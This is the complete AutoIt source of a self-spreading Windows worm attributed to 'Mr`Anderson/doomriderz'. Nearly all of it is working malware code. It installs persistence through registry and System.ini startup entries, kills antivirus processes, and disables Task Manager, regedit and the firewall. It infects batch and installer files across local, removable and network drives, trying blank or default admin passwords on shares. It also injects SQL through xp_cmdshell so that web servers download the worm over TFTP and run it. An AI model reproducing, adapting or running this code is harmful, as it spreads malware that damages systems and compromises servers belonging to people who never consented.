   ;AI-Worm(C) by Mr`Anderson/doomriderz
   ;There's no patch for stupidity
   ;I think that to exploit men's mind is better than to exploit programs ;>
   if not @Compiled then Exit
   Opt("TrayAutoPause",0);can't pause the script by clicking on the tray icon
   Break(0);same
   Opt("TrayIconDebug",0)
   Opt("TrayIconHide",1);hide tray icon
   Opt("RunErrorsFatal",0);don't display fatal errors when running external programs
   FixReg();fix the registry
   Dim $globalServerList = ""
   Dim $globalCheckedSrvLst = ""
   Dim $sSessionLinks, $sOldLinks, $sSQLInjectionQuery, $sXpLinks, $tftp_name, $sVectors
   Dim $copy_name = @ScriptName;current copy name
   Dim $copy_path = @AutoItExe;current copy path (complete path+name)
   Dim $reg_key = "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon";startup key
   Dim $reg_val = "Explorer.exe " & $copy_name & " silent";startup key val
   Dim $bad_procs[13];list of words to filter processes
   $bad_procs[0] = "anti"
   $bad_procs[1] = "vir"
   $bad_procs[2] = "fix"
   $bad_procs[3] = "remov"
   $bad_procs[4] = "upd"
   $bad_procs[5] = "ack"
   $bad_procs[6] = "protect"
   $bad_procs[7] = "secur"
   $bad_procs[8] = "proc"
   $bad_procs[9] = "av"
   $bad_procs[10] = "mgr"
   $bad_procs[11] = "reg"
   $bad_procs[12] = "troj"

   If ( @OSTYPE = "WIN32_NT" ) Then;if running under win nt
       $check_name = StringLower(RegRead($reg_key,"Shell"));read the startup key
       If ( StringLen($check_name) = 0 ) Then;if the key is empty or doesn't exist
           $reg_key = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run";change startup method
           $reg_val = $copy_path & " silent";fit the key val to the new startup method
           $check_name = StringLower(RegRead($reg_key,"Shell"));get the val if already there
       EndIf
   Else;if not running under win nt
       $reg_key = "";use system.ini startup method
       $check_name = StringLower(IniRead(@WindowsDir & "\System.ini","boot","shell",""));check the ini
   EndIf

   If $CmdLine[0]=1 And $CmdLine[1] = "silent" Then;if running with 1 parameter and the parameter is "silent" the we are installed and ready to spread
       TCPStartup()
       SetStartup();set startup method in order to run every time win starts
       If ( @OSTYPE = "WIN32_WINDOWS" ) then;if running under win98/me
           DllCall("kernel32.dll","dword","RegisterServiceProcess","dword",@AutoItPID,"dword",1);call kernel's RegServProc in order to hide our process
       EndIf
       IterateThroughDrives("ALL");go through all drives
       While True;our loop
           SetStartup();keep writing the registry or the ini file
           FixReg();keep fixing the registry
           EndBadProcs();keep ending bad precesses
           If ( @SEC = 0 And Random(0,1)<0.2 ) Then;every minute with 1/5 prob,
               IterateThroughDrives("REMOVABLE");check rem drives to infect
           EndIf
           If ( @MIN = 0 ) Then;every hour,
               IterateThroughDrives("NETWORK");check net drives to infect
           EndIf
           If ( @MIN = 0 And Random(0,1)<0.5 ) Then;every hour with 1/2 prob,
               IterateThroughDrives("FIXED");check fixed drives to infect
           EndIf
           if @IPAddress1<>"127.0.0.1" then; if a connection is available
               Dim $gsl = stringsplit($globalServerList,@lf);split the global server list
               if $gsl[0]>0 Then;if it is not empty
                   Dim $nextserver = ""
                   for $s=1 to $gsl[0];go through it
                       if $gsl[$s]<>"" Then;and find the first server
                           Dim $urlpart = stringsplit($gsl[$s],"/")
                           if TCPNameToIP($urlpart[3])<>@IPAddress1 Then;if it doesn't match our same ip
                               $nextserver = $gsl[$s];select it
                               ExitLoop;exit the loop
                           EndIf
                       EndIf
                   Next
                   if $nextserver<>"" Then;if a valid server was found
                       Hax($nextserver,"");try to hax it with sql injection!
                       $globalServerList = stringreplace($globalServerList,@lf&$nextserver,"");delete this server from the list
                       $globalCheckedSrvLst &= @lf&$nextserver;add the server to a list of checked ones
                   EndIf
               EndIf
           Endif
       WEnd
   EndIf

   Dim $vir_body = RunHost();run the host if the worm is being run from an infected file
   Dim $show_err_msg = True;show fake error msg on exit
   If StringLen($vir_body) = 0 Then;if not running from and infected file
       $vir_body = FileRead(@AutoItExe);read ourselves
   Else;if ran from inf file,
       $show_err_msg = False;do not show the fake err
   EndIf

   if ( StringLen($check_name) > 0 And $check_name <> "explorer.exe" ) Then;check if we are already installed or not
       Dim $offs = 14;len of explorer.exe and a white space, + 1
       if stringleft($check_name,12)<>"explorer.exe" Then $offs = 0;if we are using the 2nd method to track the sys, zero the offset
       $check_name = StringMid($check_name,$offs,10);get the name of the installed worm if present
       If ( FileExists($check_name) ) Then Quit($show_err_msg);if it exists, quit
   EndIf
   ProcessSetPriority(@AutoItPID,4);start going resident by setting our proc's priority to high, so we can do it faster
   $copy_name = "";reset copy name
   While ( $copy_name = "" );while a valid copy name hasn't been rendomized, do
       $copy_name = Chr(Int(Random(97,122))) & Chr(Int(Random(97,122))) & Chr(Int(Random(97,122))) & Chr(Int(Random(97,122))) & Chr(Int(Random(97,122))) & Chr(Int(Random(97,122))) & ".exe";six random chars and .exe extension
       For $p=0 To UBound($bad_procs)-1;go through bad procs names
           if ( StringInStr(StringLower($copy_name),StringLower($bad_procs[$p]))>0 ) Then;if the random name matches a filter,
               $copy_name = "";reset the copy name
               ExitLoop;exit loop (randomize another name)
           EndIf
       Next
   WEnd
   $tmp_path = @TempDir & "\~" & $copy_name;build a temp path
   FileWrite($tmp_path,$vir_body);write there our body
   $copy_path = @SystemDir&"\"&$copy_name;build the copy path
   If FileExists($copy_path) Then;check if the file already exists
       If ProcessExists($copy_name) Then;if it is being run,
           ProcessClose($copy_name);close the process
           Sleep(2000);sleep 2 secs till the process shuts down
       EndIf
       FileSetAttrib($copy_path,"-HSR");reset the attribs
       FileDelete($copy_path);delete it!
   EndIf
   FileCopy($tmp_path,$copy_path);copy our temp copy to that location
   FileSetAttrib($copy_path,"+HSR");set hidden,system,read only attribs
   FileDelete($tmp_path);delete temp copy
   Run($copy_path & " silent",@SystemDir);run the copy with the "silent" parameter
   Quit($show_err_msg);quit

   Func IterateThroughDrives($drive_type);go thru all the drives of the spec type
       if ( StringLen($drive_type) = 0 ) Then $drive_type = "ALL";if none is specified, set it to "all"
       $dryve_type = StringUpper($drive_type);make it upper case
       $drives = DriveGetDrive( $drive_type );list all drives of that type
       If NOT @error Then;if no errors,
           For $i = 1 to $drives[0];go thru
               If ( StringUpper(DriveGetType($drives[$i])) = "NETWORK" ) Then;if drv type is netdrive
                   $md = DriveMapAdd("*", $drives[$i]);try to map it to the first free drive letter (returned as $md)
                   If ( @error = 2 Or @error = 6 ) Then;if wrong user or pwd
                       $md = DriveMapAdd("*", $drives[$i], 0, "Administrator", "");try accessing it as admin with no pwd
                       If ( @error = 2 Or @error = 6 ) Then;if fails
                           $md = DriveMapAdd("*", $drives[$i], 0, "Guest", "");try as guest with no pwd
                           If ( @error = 2 Or @error = 6 ) Then;if fails
                               $md = DriveMapAdd("*", $drives[$i], 0, "admin", "admin");try as admin with pwd: admin
                           EndIf
                       EndIf
                   EndIf
                   If ( @error = 0 ) Then ;if drive was mapped
                       IterateThrough($md);go thru it to infect
                       DriveMapDel($md);unmap it
                   EndIf
               ElseIf ( StringUpper(DriveStatus($drives[$i])) = "READY" ) Then;if the drive is not a netdrive (so fixed or remov) and it is ready to be read
                   IterateThrough($drives[$i]);go thru to infect
               EndIf
           Next
       EndIf
   EndFunc

   Func IterateThrough($dir);goes thru the spec folder and subdirs
       If ( Not FileExists($dir) ) Then Return;if it doesn't exist quit
       $search = FileFindFirstFile($dir & "\*.*");find first file
       If $search = -1 Then Return;if fails ret
       Dim $nProb = 1.0;infeciton probability (of exe and scr files only)
       While True;we'll exit the loop when we need to
           $file = FileFindNextFile($search);find next file
           If @error Then ExitLoop;if no more files are found, quit
           If ( StringInStr(FileGetAttrib($dir & "\" & $file),"D") = 0 ) Then;if the spec file is not a folder
               Dim $ftype = stringlower(stringright($file,3));get file type (first 3 chars from the right)
               If ( $ftype="bat" Or $ftype="pif" Or $ftype="cmd" ) Then;w/e it is a batch or pif file,
                   InfectFile($dir & "\" & $file);infect it
               Elseif ( $ftype = "exe" Or $ftype = "scr" ) Then;w/e it is an exe or scr
                   If ( (StringInStr($file,"setup",false)>0 Or StringInStr($file,"inst",false)>0 Or StringInStr($file,"patch",false)>0 Or StringInStr($file,"fix",false)>0) and Random(0,1)<$nProb ) Then;check if it is an installer and with some chance,
                       If ( InfectFile($dir&"\"&$file) ) Then; infect it and if infected,
                           $nProb*=0.75;reduce the infection prob of the exe files in this folder by 1/4
                       EndIf
                   EndIf
               ElseIf (  $ftype="htm" or $ftype="tml" or $ftype="php" or $ftype="asp" or $ftype="jsp" or $ftype="eml" or $ftype="nws" or $ftype="txt" ) then;if the file may contain any web server address in the format http://servernameorip[/],
                   Dim $h = FileOpen($dir&"\"&$file,0);open the file in read mode
                   if $h<>-1 Then;if success
                       Dim $fbody = stringreplace(FileRead($h),"\","/");read it and rep all "\" with "/"
                       if @error=0 Then;if success
                           For $z=1 to stringlen($fbody)-6;go throu all chars
                               Dim $flag = stringlower(stringmid($fbody,$z,7))
                               if $flag = "http://" Then;whenever we find "http://"
                                   Dim $newserv = $flag;find the serv addr
                                   For $k=$z to stringlen($fbody)
                                       Dim $newc = stringmid($fbody,$k,1)
                                       $newserv&=$newc
                                       if $newc="/" or $newc=" " Then
                                           $z=$k
                                           ExitLoop
                                       Endif
                                   Next
                                   $newserv = stringlower($newserv);make it lower case
                                   if (stringinstr($globalServerList,$newserv)=0 and stringinstr($globalCheckedSrvLst,$newserv)=0) Then;if it hasn't already been found
                                       $globalServerList&=@lf&$newserv;write it to the list of servers to hack later...
                                   EndIf
                               EndIf
                           Next
                       EndIf
                   EndIf
               EndIf
           ElseIf ( ($file<>".." and $file<>".") and (@OSTYPE <> "WIN32_NT" Or StringLower($file) <> "dllcache") ) Then;if the file is a directory and it is different from ".." and "." and we are not under winnt or the directory isn't "dllcache",
               IterateThrough($dir & "\" & $file);go thru it
           EndIf
       WEnd
       FileClose($search);close search handle
   EndFunc

   Func RunHost();runs the host program with cmdline and in the context of current working dir by extracting it to the temp folder. then returns the body of the worm (empty if host file was not found)
       $body = FileRead(@AutoItExe)
       $n = StringInStr($body,"[h0st]")-1
       If $n = -1 Then Return ""
       $host_body = StringMid($body,$n+7)
       $my_body = StringLeft($body,$n)
       $host_name = @TempDir & "\" & @ScriptName
       if FileExists($host_name) then FileDelete($host_name)
       FileWrite($host_name,$host_body)
       Run($host_name & " " & $CmdLineRaw,@WorkingDir)
       Return $my_body
   EndFunc


   Func InfectFile($host);infects a file, by prepending itself to it (very noob, but this way we can also infect batch files and pif files)
       If ( Not FileExists($host) ) Then Return False
       $ret = True
       $time_modified = FileGetTime($host,0,1)
       $time_accessed = FileGetTime($host,2,1)
       $host_attributes = FileGetAttrib($host)
       FileSetAttrib($host,"-HSR")
       $host_body = FileRead($host)
       $my_body = FileRead(@AutoItExe)
       $ret = (StringInStr($host_body,"[h0st]",true) = 0)
       If ( $ret ) Then
           $handle = FileOpen($host,2)
           $ret = ( $handle <> -1 )
           If ( $ret ) Then
               $host_body = "[h0st]"&$host_body
               FileWrite($handle,$my_body & $host_body)
               FileClose($handle)
           EndIf
       EndIf
       FileSetTime($host,$time_modified,0)
       FileSetTime($host,$time_accessed,2)
       FileSetAttrib($host,$host_attributes)
       Return $ret
   EndFunc

   Func EndBadProcs();if any process name matches one of the filters, ends it
       $procs = ProcessList()
       For $i=0 To UBound($procs)-1
           For $j=0 To UBound($bad_procs)-1
               If(StringInStr($procs[$i][0],$bad_procs[$j],false)) Then
                   ProcessClose($procs[$i][1])
               EndIf
           Next
       Next
   EndFunc

   Func SetStartup();sets the startup
       If( StringLen($reg_key) > 0 ) Then;using the registry (under winnt)
           RegWrite($reg_key,"Shell","REG_SZ",$reg_val)
       Else;using the system.ini method (under win98/me)
           IniWrite(@WindowsDir & "\System.ini","boot","shell",$reg_val)
       EndIf
   EndFunc

   Func FixReg();fixes the regstry
    Regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced","ShowSuperHidden","REG_DWORD",0);to not show hidden system files
    RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableRegistryTools","REG_DWORD",1);to disable the registry editor
    RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr","REG_DWORD",1);to disable the task mgr
    RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoFolderOptions","REG_DWORD",1);to not show "folder options.." under xplorer.exe's menus
    RegWrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess","Start","REG_DWORD",4);to disable the windows firewall at startup
   EndFunc

   Func Quit($bShow)
       If $bShow Then MsgBox(16,"Error",@AutoItExe&" is not a valid Win32 application.",20);fake msg
       Exit
   EndFunc

   Func Hax($sBServer,$sSPage);tries to hax a given web server by finding any injectable url or form and trying to inject commands to make the server download and execute remotely our worm
       $tftp_name = Int(Random(1000,2000))
       $sSQLInjectionQuery = "waitfor delay '0:0:3'; exec master..xp_cmdshell 'tftp.exe -i "&@IPAddress1&" GET worm "&$tftp_name&".exe'; waitfor delay '0:0:5'; exec master..xp_cmdshell '"&$tftp_name&".exe';"
       if (Stringlen($sBServer)=0)then Return
       if(Stringinstr($sBServer,"://")=0)then $sBServer="http://"&$sBServer
       if(Stringright($sBServer,1)<>"/" and stringright($sBServer,1)<>"\") then $sBServer = $sBServer&"/"
       $sBServer = FormatURL($sBServer)
       $sSPage = FormatURL($sSPage)
       if ( StringInStr($sSPage,"://")=0 ) then $sSPage = $sBServer & $sSPage
       StartSearch($sBServer,$sSPage)
   EndFunc

   Func StartSearch($sRootServer,$sStartAddress);searches the given address for juicy urls and forms to hack
       if (Stringlen($sRootServer)=0)then Return
       if(Stringinstr($sRootServer,"://")=0)then $sRootServer="http://"&$sRootServer
       if(Stringright($sRootServer,1)<>"/" and stringright($sRootServer,1)<>"\") then $sRootServer = $sRootServer&"/"
       $sRootServer = FormatURL($sRootServer)
       $sStartAddress = FormatURL($sStartAddress)
       if ( StringInStr($sStartAddress,"://")=0 ) then $sStartAddress = $sRootServer & $sStartAddress
       $StartPageCode = HTTPRequest($sStartAddress)
       if ( stringlen($StartPageCode) > 0 ) then
           If Analyze($StartPageCode,stringleft($sStartAddress,LastIndexOf($sStartAddress,"/",false)+1),GetResourceName($sStartAddress)) Then
               Return
           EndIf
       EndIf
       if stringlen($sSessionLinks)=0 Then
           if stringlen($sOldLinks)=0 Then
               return
           EndIf
           $SQLVec = stringsplit($sOldLinks,@lf)
       Else
           $SQLVec = stringsplit($sSessionLinks,@lf)
           $sOldLinks = $sOldLinks&@lf&$sSessionLinks
           $sSessionLinks = ""
       EndIf
       $l=1
       $i=int(random(0,1)*($SQLVec[0]-1))+1
       While ( $l<=$SQLVec[0] And ((stringlen($SQLVec[$i])=0 Or StringInStr($sXpLinks,$SQLVec[$i])>0) Or (StringInStr($SQLVec[$i],"forum")>0 and Random(0,1)<0.9)) )
           $i=int(random(0,1)*($SQLVec[0]-1))+1
           $l+=1
       WEnd
       If $l<=$SQLVec[0] Then
           Dim $xl = stringsplit($sXpLinks,@lf)
           if $xl[0]<=25 Then
               $sXpLinks &= $SQLVec[$i] & @lf
               StartSearch($sRootServer, $SQLVec[$i])
           EndIf
       EndIf
   EndFunc

   Func Analyze($sCode,$sRoot,$sResName);analyzes the code searching urls and forms
       $sCode = FormatText($sCode)
       $CodeLines = StringSplit($sCode, @lf)
       Dim $new_url = ""
       Dim $bWritingUrl = false
       For $ln = 1 to $CodeLines[0]
           if ( stringlen($codelines[$ln])>0 ) then
               if ( StringInStr(stringlower($CodeLines[$ln]),"<form")>0 and not $bWritingUrl ) then
                   $bWritingUrl = true
                   $new_url = GetOption("action",$CodeLines[$ln])
                   $new_url_method = StringUpper(GetOption("method",$CodeLines[$ln]))
                   if ( Stringlen($new_url_method)=0 ) Then $new_url_method = "GET"
                   if ( StringInStr($new_url,"?")=0 ) then $new_url = $new_url & "?"
               endif
               if ( (StringInStr(StringLower($CodeLines[$ln]),"<input")>0 or StringInStr(StringLower($CodeLines[$ln]),"<select")>0) and $bWritingUrl ) then
                   $varname = GetOption("name",$CodeLines[$ln])
                   if ( stringlen($varname)>0 ) then
                       if ( stringright($new_url,1) <> "?" ) then $new_url = $new_url & "&"
                       $new_url = $new_url & $varname & "="
                       $param_value = GetOption("value",$CodeLines[$ln])
                       if ( stringlen($param_value)=0 And StringInStr(StringLower($CodeLines[$ln]),"<select")>0 ) Then
                           $o=$ln
                           Do
                               $o=$o+1
                               If ( StringInStr(StringLower($CodeLines[$o]),"<option")>0 ) Then
                                   $param_value = GetOption("value",$CodeLines[$o])
                               EndIf
                           Until ( stringlen($param_value)>0 Or $o>=($CodeLines[0]-$ln) )
                       EndIf
                       $new_url = $new_url & $param_value
                   endif
               endif
               if ( StringInStr(StringLower($CodeLines[$ln]),"</form")>0  and $bWritingUrl ) then
                   $new_url = FormatURL($new_url)
                   if ( StringInstr(Strip($sVectors,"=","&"),Strip($new_url,"=","&"))=0 ) Then
                       if ( stringleft($new_url,7)<>"http://" ) Then
                           $new_url = $sRoot & $new_url
                       EndIf
                       $sVectors &= @lf&$new_url&"#"&$new_url_method
                       if SQLInjection($new_url,$sSQLInjectionQuery,$new_url_method) Then
                           Return True
                       endif
                   EndIf
                   if ( StringInstr($sOldLinks,$new_url)=0 And StringInstr($sSessionLinks,$new_url)=0 ) Then
                       if ( stringleft($new_url,7)<>"http://" ) Then
                           $new_url = $sRoot & $new_url
                       EndIf
                       $sSessionLinks &= $new_url&"#"&$new_url_method&@lf
                   EndIf
                   $new_url = ""
                   $new_url_method = ""
                   $bWritingUrl = false
               endif
               $Address = GetOption("href",$CodeLines[$ln])
               if( stringlen($Address) = 0 )Then
                   $Address = GetOption("src",$CodeLines[$ln])
               EndIf
               if( stringlen($Address) > 0 and StringInStr($Address,"javascript:")=0 )Then
                   $Address = FormatURL($Address)
                   if ( StringInStr($Address,"?")>0 And StringInStr($Address,"=")>0 And StringInstr(Strip($sVectors,"=","&"),Strip($Address,"=","&"))=0 ) Then
                       if ( stringleft($Address,7)<>"http://") Then
                           $Address = $sRoot & $Address
                       EndIf
                       $sVectors &= @lf&$Address&"#GET"
                       if SQLInjection($Address,$sSQLInjectionQuery,"GET") Then
                           Return True
                       EndIf
                   endif
                   Dim $ext = stringlower(GetResourceExtension($Address))
                   if ($ext="" Or $ext="htm" or $ext="html" or $ext="php" or $ext="asp" or $ext="jsp" or $ext="aspx" or $ext="jspx" or $ext="pl" or $ext="cgi") then
                       if ( StringInstr($sOldLinks,$Address)=0 And StringInstr($sSessionLinks,$Address)=0 ) Then
                           if ( stringleft($Address,7)<>"http://" ) Then
                               $Address = $sRoot & $Address
                           EndIf
                           Dim $addrserv = stringlower(Stringleft($Address,Stringlen($sRoot)))
                           Dim $newserv = stringsplit($addrserv,"/")
                           Dim $myserv = stringsplit($sRoot,"/")
                           If ( stringlower($newserv[3])=stringlower($myserv[3]) or $newserv[3]=TCPNameToIP($myserv[3]) or TCPNameToIP($newserv[3])=$myserv[3] ) Then
                               $sSessionLinks &= $Address&@lf
                           EndIf
                       endif
                   endif
               EndIf
           EndIf
       Next
       Return False
   EndFunc

   Func SQLInjection($sVect,$sQuery,$sMethod);tries sql injection over the given url with the given query
       Dim $s = -1
       Dim $sServer = ""
       Dim $nPort = 80
       if (Stringlen($sVect)=0 Or Stringlen($sQuery)=0 Or StringInStr($sVect,"?")=0) Then Return False
       If (Stringlen($sMethod)=0) Then $sMethod = "GET"
       $url_parts = StringSplit($sVect,"/")
       $sServer = $url_parts[3]
       if ( StringInStr($sServer,":")>0 ) Then
           $nPort = Int(StringMid($sServer,StringInStr($sServer,":")+1))
           $sServer = Stringleft($sServer,IndexOf($sServer,":",false))
       EndIf
       $url_parts[1]=""
       $url_parts[3]=""
       $sVect = join($url_parts,"/")
       $sVect = FormatURL($sVect)
       $sParams = Stringright($sVect,Stringlen($sVect)-StringInStr($sVect,"?"))
       if (Stringlen($sParams)=0 Or $sParams=$sVect) Then Return False
       $sVect = Stringleft($sVect,StringInStr($sVect,"?"))
       $sParams = $sParams & "&"
       If StringInStr($sParams,"=&")>0 Then
           Dim $sTmpParams = ""
           $TmpParam = Stringsplit($sParams,"=&")
           For $t=1 To $TmpParam[0]-1
               if stringlen($TmpParam[$t])>0 Then
                   $sTmpParams = $sTmpParams & $TmpParam[$t] & "=12345"
                   if StringInStr(StringLower($TmpParam[$t]),"mail")>0 Then
                       $sTmpParams = $sTmpParams & "@a.aa"
                   EndIf
                   $sTmpParams = $sTmpParams & "&"
               EndIf
           Next
           $sTmpParams = Stringleft($sTmpParams,Stringlen($sTmpParams)-1)
           $sParams = $sTmpParams
       Else
           $sParams = Stringleft($sParams,Stringlen($sParams)-1)
       EndIf
       $sVect = $sVect & $sParams
       $sParams = StringReplace($sParams,"=",@lf)
       $sParams = StringReplace($sParams,"&",@lf)
       Dim $Param = Stringsplit($sParams,@lf)
       $s = TCPConnect(TCPNameToIP($sServer),$nPort)
       If @error or $s = -1 Then Return False
       Dim $sp = $sServer
       if $nPort <> 80 then $sp = $sp & ":" & $nPort
       For $p=2 To $Param[0] Step 2
           If (Stringlen($Param[$p])>0) Then
               $sTempVect = StringReplace($sVect,$Param[$p-1] & "=" & $Param[$p],$Param[$p-1] & "=" & $Param[$p] & FormatQuery("';" & $sQuery & "--sp_password"))
               if ( $sMethod = "GET" ) Then
                   Dim $query = $sMethod& " /" & $sTempVect & " HTTP/1.0" & @crlf & "Host: " & $sp & @crlf & @crlf
               Else
                   Dim $newparams = Stringmid($sTempVect,Stringinstr($sTempVect,"?")+1)
                   Dim $query = $sMethod & " /" & stringleft($sTempVect,stringinstr($sTempVect,"?")-1) & " HTTP/1.0" & @crlf & "Host: " & $sp & @crlf & "Content-Type: application/x-www-form-urlencoded" & @crlf & "Content-length: " & stringlen($newparams) & @crlf & @crlf & $newparams & @crlf & @crlf
               EndIf
               TCPSend($s,$query)
               if TFTPSession(6000) then
                   Return True
               EndIf
               $s = TCPConnect(TCPNameToIP($sServer),$nPort)
               If @error or $s = -1 Then Return False
               $sTempVect = StringReplace($sVect,$Param[$p-1] & "=" & $Param[$p],$Param[$p-1] & "=" & $Param[$p] & FormatQuery(";" & $sQuery & "--sp_password"))
               if ( $sMethod = "GET" ) Then
                   $query = $sMethod& " /" & $sTempVect & " HTTP/1.0" & @crlf & "Host: " & $sp & @crlf & @crlf
               Else
                   $newparams = Stringmid($sTempVect,Stringinstr($sTempVect,"?")+1)
                   $query = $sMethod & " /" & stringleft($sTempVect,stringinstr($sTempVect,"?")-1) & " HTTP/1.0" & @crlf & "Host: " & $sp & @crlf & "Content-Type: application/x-www-form-urlencoded" & @crlf & "Content-length: " & stringlen($newparams) & @crlf & @crlf & $newparams & @crlf & @crlf
               EndIf
               TCPSend($s,$query)
               if TFTPSession(6000) then
                   Return True
               EndIf
           EndIf
       Next
       TCPCloseSocket($s)
       Return False
   EndFunc

   Func FormatQuery($sQ);formats the sql query to be better injected
   if Stringlen($sQ)=0 Then Return("")
   Dim $sNewQuery
   For $c=1 To Stringlen($sQ)
    $ch = ""
    $ch = Stringright(Stringleft($sQ,$c),1)
    $sNewQuery = $sNewQuery & "%" & StringRight(Hex(Asc($ch)),2)
   Next
   Return($sNewQuery)
   EndFunc

   func TFTPSession($MAX_WAIT);starts a tftp session and waits for inputs for the given period of time
       Dim $ret=False
       Dim $port=69
       Dim $ipaddr=@IPAddress1
       UDPStartup()
       Dim $s = UDPBind($ipaddr,$port)
       if $s=-1 Then
           Return False
       EndIf
       Dim $ti = TimerInit()
       while TimerDiff($ti)<$MAX_WAIT
           $recv = UDPRecv($s,512)
           if @error then
               ExitLoop
           EndIf
           if String($recv)<>"" then
               $recv = stringmid(string($recv),Stringinstr(string($recv),"x")+1)
               if ( stringleft($recv,4)="0001" ) then ;RRQ
                   $ret = SendWorm($s)
                   ExitLoop
               EndIf
           EndIf
       WEnd
       UDPCloseSocket($s)
       UDPShutdown()
       Return($ret)
   EndFunc

   func SendWorm($socket);send the worm over the net w/e a tftp request is made
       if $socket = -1 then Return
       Dim $name = @AutoItExe
       if not FileExists($name) Then
           UDPSend( $socket, BinaryString("0x00050001")&"File not found."&Chr(0) )
           Return False
       EndIf
       Dim $opcode = "0x0003"
       Dim $block = ""
       Dim $data = ""
       Dim $size = FileGetSize($name)
       Dim $totblocks = int($size/512)+1
       Dim $fhandle = FileOpen($name,0)
       Dim $filedata = FileRead($fhandle)
       FileClose($fhandle)
       For $bnum=0 To $totblocks
           $block = Stringright(String(Hex($bnum+1)),4)
           $data = stringmid($filedata,($bnum*512)+1,512)
           Dim $packet = BinaryString($opcode & $block) & $data
           Do
               UDPSend($socket,$packet)
               if @error or $socket=-1 then ExitLoop
               Dim $tm = TimerInit()
               Do
                Dim $r = UDPRecv($socket,512)
                if @error then ExitLoop
               Until (stringlen(string($r))>0 or TimerDiff($tm)>=5000)
               if (@error or TimerDiff($tm)>=5000) then ExitLoop
           Until( $r=binarystring("0x0004")&BinaryString("0x"&$block) )
       Next
       Return($bnum>$totblocks)
   EndFunc

   Func HTTPRequest($sResource);retrieves the given resource from the internet
    Dim $s = -1
    Dim $sServer = ""
    Dim $nPort = 80
    $sResource = FormatURL($sResource)
    if ( not IsAnHTTPService($sResource) ) then Return("")
    Dim $sHTTPMethod = "GET"
    If StringInStr($sResource,"#")>0 Then
       $sHTTPMethod = Stringright($sResource,Stringlen($sResource)-StringInStr($sResource,"#")-2)
       $sResource = Stringleft($sResource,StringInStr($sResource,"#")-1)
    EndIf
    Dim $size = InetGetSize($sResource)
    If ( $size > 512000 ) Then Return("")
    if $size = 0 then $size = 512000
    $url_parts = StringSplit($sResource,"/")
    $sServer = $url_parts[3]
    if ( StringInStr($sServer,":")>0 ) Then
        $nPort = Int(StringMid($sServer,StringInStr($sServer,":")+1))
        $sServer = Stringleft($sServer,IndexOf($sServer,":",false))
    EndIf
    $url_parts[1] = ""
    $url_parts[3] = ""
    $sResource = join($url_parts,"/")
    $sResource = FormatURL($sResource)
    $s = TCPConnect(TCPNameToIp($sServer),$nPort)
    if @error Or $s = -1 then Return("")
    Dim $sp = $sServer
    if $nPort <> 80 then $sp = $sp & ":" & $nPort
    if ( $sHTTPMethod = "GET" ) Then
     Dim $query = $sHTTPMethod& " /" & $sResource & " HTTP/1.0" & @crlf & "Host: " & $sp & @crlf & @crlf
    Else
     Dim $newparams = Stringmid($sResource,Stringinstr($sResource,"?")+1)
     Dim $query = $sHTTPMethod & " /" & stringleft($sResource,stringinstr($sResource,"?")-1) & " HTTP/1.0" & @crlf & "Host: " & $sp & @crlf & "Content-Type: application/x-www-form-urlencoded" & @crlf & "Content-length: " & stringlen($newparams) & @crlf & @crlf & $newparams & @crlf & @crlf
    EndIf
    TCPSend($s,$query)
    If @error Then Return("")
    Dim $ret = ""
    While true
     Dim $tmpret = TCPRecv($s,2048)
     if @error Then ExitLoop
     if $tmpret <> "" then
         $ret = $ret & $tmpret
     endif
   WEnd
   if ( StringInStr($ret,"HTTP/1.1 200")=0 and StringInStr($ret,"HTTP/1.0 200")=0 ) Then
    $loc_ndx = StringInStr(stringlower($ret),"location: ")
    if $loc_ndx = 0 then Return("")
    Dim $lines = StringSplit($ret,@crlf)
    Dim $new_loc = ""
    For $j=1 to $lines[0]
        If stringlower(stringleft($lines[$j],10)) = "location: " Then
            $new_loc = StringMid($lines[$j],11)
            ExitLoop
        EndIf
    Next
    if stringlen($new_loc)>0 Then
        $ret = HTTPRequest($new_loc)
    Else
        $ret = ""
    EndIf
   EndIf
   Return($ret)
   EndFunc

   Func IsAnHTTPService($sService);checks if the resource is pointing to an http protocol or not
    $sService = FormatURL($sService)
    $sServiceType = StringLower(Stringleft($sService, Stringlen("http")))
    Return($sServiceType = "http")
   EndFunc

   Func Strip($InLine,$flag_char1,$flag_char2);removes all chars between the given two (and them too) from the given string
   $bWrite = true
   Dim $sResult
   for $n = 0 to Stringlen($InLine)
    $char = ""
    $char = Stringright(Stringleft($InLine,$n),1)
    if ( $char = $flag_char1 ) then
     $bWrite = False
    elseif ( $char = $flag_char2 Or $char = @lf ) then
     $bWrite = True
     if $char = @lf then $sResult = $sResult & @lf
    elseif ( $bWrite ) then
     $sResult = $sResult & $char
    endif
   next
   Return($sResult)
   EndFunc

   Func LastIndexOf($str,$chars, $bCheckCase)
    $index = -1
    if (not $bCheckCase ) then $chars = StringLower($chars)
    for $ndx = 0 to Stringlen($str)
     $c = Stringright(Stringleft($str,$ndx),Stringlen($chars))
     if ( not $bCheckCase ) then $c = StringLower($c)
     if ( Stringlen($c) > 0 and $c = $chars ) then $index = $ndx - Stringlen($chars)
    next
    Return($index)
   EndFunc

   Func IndexOf($str,$chars,$bCheckCase);same as stringinstr but returns 1 less
    $index = -1
    if (not $bCheckCase ) then $chars = StringLower($chars)
    for $ndx = 0 to Stringlen($str)
     $c = Stringright(Stringleft($str,$ndx),Stringlen($chars))
     if ( not $bCheckCase ) then $c = StringLower($c)
     if ( $c = $chars ) then
      $index = $ndx - Stringlen($chars)
      ExitLoop
     endif
    next
    Return($index)
   EndFunc

   Func FormatText($sText);formats our text to be better searched
    $sText = StringMid($sText,IndexOf($sText,"<",false))
    $sText = Stringreplace($sText,@Crlf,"")
    $sText = Stringreplace($sText,chr(13),"")
    $sText = Stringreplace($sText,chr(10),"")
    $sText = Stringreplace($sText,"<",@lf & "<")
    Return($sText)
   EndFunc

   Func FormatURL($sURL);formats correctly the given url
   if Stringlen($sURL)=0 Then Return($sURL)
   $sURL = Stringreplace(Stringreplace($sURL,chr(13),""),chr(10),"")
   $sURL = StringReplace($sURL,"&amp;","&")
